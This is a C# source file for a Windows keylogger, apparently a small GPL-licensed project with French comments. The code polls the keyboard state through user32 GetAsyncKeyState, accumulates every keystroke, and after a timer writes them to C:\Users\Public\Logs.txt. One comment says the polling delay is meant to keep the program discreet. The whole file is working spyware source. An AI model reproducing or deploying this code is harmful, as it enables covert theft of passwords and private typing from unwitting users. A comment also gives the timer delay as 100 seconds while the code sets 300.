
//Copyright © 2015 Ernest Foussard
//
//This file is part of Keylogger.

//    Keylogger is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, version 3 of the License.

//    Keylogger is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.

//    You should have received a copy of the GNU General Public License
//    along with Keylogger.  If not, see <http://www.gnu.org/licenses/>.



using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms; // On importe cette librairie pour la methode Keys
using System.Configuration;

namespace Keylogger
{
    class Program
    {
        
        [DllImport("user32.dll")] //Le DLL est nécessaire pour fonctionner
        public static extern int GetAsyncKeyState(Int32 i); //Permet d'obtenir l'état du clavier en temps réel
       
        static void Main(string[] args)
        {
            System.Threading.Timer timer = new System.Threading.Timer(Save); // On crée un timer qui execute la methode Save au tick
            timer.Change(300000, 1000); // On définit au bout de combien de temps va s'executer le timer (100s en l'occurence), la periode n'a aucune importance
            while (true) //Boucle infinie
            {
                Thread.Sleep(10); // On attend 10 ms pour éviter de consommer trop de ressources et rester discret
                for (byte i = 0; i < 255; i++) //on va boucler pour chaque caractère du clavier (on choisit byte car on va de 0 à 254 et la plage de byte va de 0 à 255)
                {
                    int keyState = GetAsyncKeyState(i); // On récupère l'état de touche à l'index i
                    if (keyState == 1 || keyState == -32767)
                        // keyState == -32767 (lol:p) renvoie True quand la touche d'index i est pressée 
                        // keyState == 1 renvoie True dans le cas éventuel et très peu probable que le quidam arrive à taper et retirer le doigt entre cette
                        // instruction et l'instruction précedente (enfin bon, sait-on jamais^^)
                    {
                        ConfigurationManager.AppSettings["Logs"] = ConfigurationManager.AppSettings["logs"] + (Keys)i; // On stocke dans AppSettings au fur et à mesure
                        //Console.WriteLine(ConfigurationManager.AppSettings["Logs"]); debugg
                        break; // Et on arrête la boucle
                    }
                }
            }
        }
        static TimerCallback Save = (state) =>
        //Delegate de timer pointant sur une methode anonyme definie ci-dessous
        //Ecrit les logs dans le fichier Users\Public\Logs.txt puis ferme l'application
        {
            string str = System.IO.File.ReadAllText(@"C:\Users\Public\Logs.txt"); // On récupère le contenu du fichier
            using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\Users\Public\Logs.txt")) // On lui ajoute les nouveaux logs et on sauvegarde
            {
               file.WriteLine(str +ConfigurationManager.AppSettings["Logs"] + "Fin de la lecture");
            }
            Environment.Exit(0); // on ferme l'application
        };
    }
} 
